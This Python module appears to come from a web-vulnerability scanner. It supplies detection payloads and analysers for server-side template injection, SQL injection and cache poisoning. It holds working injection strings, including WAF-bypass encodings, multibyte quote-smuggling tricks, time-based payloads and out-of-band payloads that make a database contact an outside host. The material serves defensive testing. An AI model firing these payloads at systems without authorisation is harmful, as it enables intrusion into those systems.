"""Active differential probes for high-payout vulnerability classes.

Detection-oriented (not weaponised): each probe sends the smallest benign marker
that *proves the class* and diffs against a control, so the verdict is evidence,
not a guess. Payload data + pure analysers live here; the async orchestration
(fetch baseline + tests, poll OAST) lives in the server tools, which feed the
signals into :func:`moonmcp.confirm.evaluate`.
"""

from __future__ import annotations

import re

# --- SSTI: arithmetic that only renders if the input hits a template engine ---
# 7331*7 = 51317 — a value unlikely to appear on a page by chance. If the result
# shows up (and the literal payload does not), the expression was evaluated.
SSTI_EXPECTED = "51317"
SSTI_PAYLOADS: list[tuple[str, str]] = [
    ("Jinja2/Twig", "{{7331*7}}"),
    ("Freemarker/JSP-EL", "${7331*7}"),
    ("ERB/JSP-scriptlet", "<%= 7331*7 %>"),
    ("Smarty", "{7331*7}"),
    ("Velocity", "#set($m=7331*7)$m"),
    ("Razor", "@(7331*7)"),
    ("Handlebars/other", "#{7331*7}"),
]

# --- SQLi: benign boolean pair + an error trigger (no data extraction) ---
SQLI_ERROR = "'"
SQLI_TRUE = "1' AND '1'='1"
SQLI_FALSE = "1' AND '1'='2"

# Context-specific boolean twins. In a value position the '1'='1' pair works; in an
# ORDER BY / LIMIT identifier position it is meaningless (a quote often doesn't even
# error there), so use a CASE expression whose numeric result (sort key / row count)
# changes ONLY if the DB evaluates it — reflected literally it produces no differential.
SQLI_CONTEXT_TWINS: dict[str, tuple[str, str]] = {
    "value": (SQLI_TRUE, SQLI_FALSE),
    "order_by": ("(CASE WHEN 1=1 THEN 1 ELSE 2 END)", "(CASE WHEN 1=2 THEN 1 ELSE 2 END)"),
    "limit": ("(CASE WHEN 1=1 THEN 8 ELSE 1 END)", "(CASE WHEN 1=2 THEN 8 ELSE 1 END)"),
}


def sqli_context_twins(context: str) -> tuple[str, str]:
    return SQLI_CONTEXT_TWINS.get(context, SQLI_CONTEXT_TWINS["value"])


def sqli_oob_payloads(canary_host: str | None, http_url: str) -> list[tuple[str, str]]:
    """Per-DBMS out-of-band (OAST) payloads. Detection-only: each payload's SOLE
    effect is an outbound DNS/HTTP lookup to the canary — no data is encoded into
    the callback (that weaponised DNS exfil is delegated to sqlmap `--dns-domain`)."""

    host = canary_host or http_url
    return [
        ("Oracle UTL_HTTP", f"1'||(SELECT UTL_HTTP.REQUEST('{http_url}') FROM dual)||'"),
        ("MSSQL xp_dirtree", f"1';EXEC master..xp_dirtree '\\\\{host}\\x';--"),
        ("MySQL LOAD_FILE", f"1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','{host}','\\\\x'))-- -"),
    ]


def sqli_time_payloads(seconds) -> list[tuple[str, str]]:
    """Per-DBMS time-based blind payloads sleeping ``seconds`` (0 = the control)."""

    return [
        ("MySQL", f"1' AND SLEEP({seconds})-- -"),
        ("PostgreSQL", f"1' AND (SELECT 1 FROM PG_SLEEP({seconds})) IS NOT NULL-- -"),
        ("MSSQL", f"1';WAITFOR DELAY '0:0:{seconds}'--"),
    ]


def assess_timing(zero_s: float, delay_s: float, requested: float) -> dict | None:
    """Time-blind confirmation: the delayed request must be slower than the 0s
    control by a margin proportional to the requested delay. This rejects a
    uniformly-slow endpoint (both requests would be slow) and random jitter."""

    if requested <= 0:
        return None
    delta = delay_s - zero_s
    if delta >= max(0.6 * requested, 0.5) and zero_s < requested:
        return {"zero_s": round(zero_s, 3), "delay_s": round(delay_s, 3),
                "delta_s": round(delta, 3), "requested_s": requested}
    return None


# JSON-operator WAF-bypass twins (C.2): the boolean wrapped in JSON syntax the WAF
# doesn't tokenise but the DB executes. (label, true_payload, false_payload).
SQLI_JSON_TWINS: list[tuple[str, str, str]] = [
    ("pgsql-jsonb", "1' AND '{\"a\":1}'::jsonb @> '{\"a\":1}'-- -",
                    "1' AND '{\"a\":1}'::jsonb @> '{\"a\":2}'-- -"),
    ("mysql-json", "1' AND JSON_EXTRACT('{\"a\":1}','$.a')=1-- -",
                   "1' AND JSON_EXTRACT('{\"a\":1}','$.a')=2-- -"),
]

# WAF-bypass encoding twins (C.5): comment/versioned-comment obfuscation of the keyword.
SQLI_ENCODING_TWINS: list[tuple[str, str, str]] = [
    ("inline-comment", "1'/**/AND/**/'1'='1", "1'/**/AND/**/'1'='2"),
    ("versioned-comment", "1'/*!50000AND*/'1'='1", "1'/*!50000AND*/'1'='2"),
]

# Multibyte charset-mismatch twins (C.4): already percent-encoded, so they must be
# injected RAW (inject_raw), not re-encoded. A lead byte whose 2nd byte is 0x5c
# swallows addslashes' backslash, leaving the following quote live.
SQLI_PLAIN_QUOTE = "%27"
SQLI_MULTIBYTE_TWINS: list[tuple[str, str]] = [
    ("GBK", "%bf%27"),
    ("Shift-JIS", "%82%27"),
    ("EUC-KR", "%a1%27"),
]

# --- Cache poisoning: unkeyed headers that frameworks often reflect ---
CACHE_HEADERS = [
    "X-Forwarded-Host", "X-Forwarded-Scheme", "X-Forwarded-Server",
    "X-Host", "X-Forwarded-Port", "X-Original-URL", "X-Rewrite-URL",
]
_CACHE_HIT_HEADERS = ("x-cache", "cf-cache-status", "x-drupal-cache",
                      "x-varnish", "age", "x-cache-hits")


# Match the result on digit boundaries so a longer digit run (an epoch, an ID)
# containing "51317" doesn't count as an evaluation.
_SSTI_RE = re.compile(r"(?<!\d)" + re.escape(SSTI_EXPECTED) + r"(?!\d)")


def ssti_findings(baseline_body: str, tested: list[tuple[str, str, str]]) -> list[dict]:
    """Given ``(engine, payload, response_body)`` triples, return the engines whose
    arithmetic was **evaluated** — the result appears (on digit boundaries), the
    literal payload does NOT (so it's rendering, not reflection), and the same
    result isn't already present in the baseline."""

    if _SSTI_RE.search(baseline_body):
        return []  # the marker occurs naturally on the page — can't distinguish
    out: list[dict] = []
    for engine, payload, body in tested:
        if _SSTI_RE.search(body) and payload not in body:
            out.append({"engine": engine, "payload": payload, "evaluated_to": SSTI_EXPECTED})
    return out


def cacheable(headers_map: dict[str, str]) -> tuple[bool, list[str]]:
    """Heuristic: does the response look cacheable/served-from-cache?

    Cache-Control is parsed numerically: ``max-age=0`` / ``s-maxage=0`` /
    ``no-cache`` / ``no-store`` / ``private`` are NOT cacheable. A cache-hit header
    (Age, X-Cache, …) still counts — it proves the response was served from a cache.
    """

    reasons: list[str] = []
    lower = {k.lower(): v for k, v in headers_map.items()}
    cc = lower.get("cache-control", "").lower()
    if "no-store" not in cc and "no-cache" not in cc and "private" not in cc:
        ma = re.search(r"\bmax-age=(\d+)", cc)
        sma = re.search(r"\bs-maxage=(\d+)", cc)
        positive_age = (ma is not None and int(ma.group(1)) > 0) or \
                       (sma is not None and int(sma.group(1)) > 0)
        if "public" in cc or positive_age:
            reasons.append(f"Cache-Control: {cc}")
    for h in _CACHE_HIT_HEADERS:
        if h in lower:
            reasons.append(f"{h}: {lower[h]}")
    return (bool(reasons), reasons)
